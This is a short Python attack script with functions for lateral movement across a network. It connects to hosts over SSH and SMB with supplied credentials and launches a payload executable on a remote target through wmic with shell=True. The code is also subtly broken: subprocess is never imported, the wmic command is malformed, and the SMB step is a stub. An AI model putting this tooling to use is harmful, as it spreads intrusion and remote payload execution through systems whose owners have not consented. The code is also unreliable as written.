import paramiko
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport

def ssh_to_host(hostname, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname, username=username, password=password)
    stdin, stdout, stderr = ssh.exec_command('whoami')
    print(f"Connected to {hostname}: {stdout.read().decode()}")

def smb_lateral_movement(target_ip, username, password):
    conn = SMBConnection(target_ip, target_ip)
    conn.login(username, password)
    conn.listShares()
    print(f"Accessing shares on {target_ip}")
    # Place your lateral movement logic here

def wmi_lateral_movement(target_ip, username, password):
    print(f"Attempting WMI execution on {target_ip}")
    command = f"wmic /user:{username} /password:{password} {target_ip} process call create 'C:\\path\\to\\payload.exe'"
    subprocess.run(command, shell=True)
